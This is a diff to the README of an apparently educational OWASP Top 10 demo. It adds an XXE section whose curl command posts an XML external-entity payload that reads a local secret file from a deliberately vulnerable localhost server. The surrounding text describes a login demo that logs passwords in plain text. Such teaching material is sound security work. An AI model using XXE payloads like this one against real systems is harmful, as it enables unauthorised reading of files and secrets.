@@ -58,3 +58,17 @@ node logi.js
 
 Open your browser and navigate to http://localhost:3000/logi.html. You can use any combination of username and password
 to log in, and the password will be presented in plain text in the application's console.
+
+### A4:2017 XML External Entities (XXE)
+
+Run the XXE demo:
+```
+node logi.js
+```
+
+Send a payload with the following form:
+```
+curl -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "/full/path/to/owasp-top10-demo/secret.txt">]><name>&xxe;</name>' http://localhost:3000/xxe
+```
+
+And you should get back the **contents** of the [secret.txt](secret.txt) file, i.e., `THIS IS A SECRET!!!`.
